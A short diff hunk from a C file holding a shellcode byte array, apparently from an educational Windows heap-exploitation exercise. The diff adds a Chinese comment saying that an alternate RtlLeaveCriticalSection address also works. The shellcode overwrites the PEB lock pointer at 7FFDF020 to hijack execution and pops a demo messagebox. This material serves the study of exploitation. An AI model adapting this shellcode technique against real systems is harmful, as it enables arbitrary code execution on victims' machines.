@@ -12,6 +12,7 @@ char shellcode[]=
     "\xB8\x20\xF0\xFD\x7F"  //MOV EAX,7FFDF020
     "\xBB\x03\x91\xF8\x77"  //MOV EBX,77F89103/77F89134 the address here may releated to your OS
                             //分别为RtlEnterCriticalSection()和RtlLeaveCriticalSection()的地址（地址获取参考Reference中方法）
+                            //此处地址换成77F89134也能正确弹出messagebox
     "\x89\x18"            //MOV DWORD PTR DS:[EAX],EBX
     
     "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"   //弹出messagebox
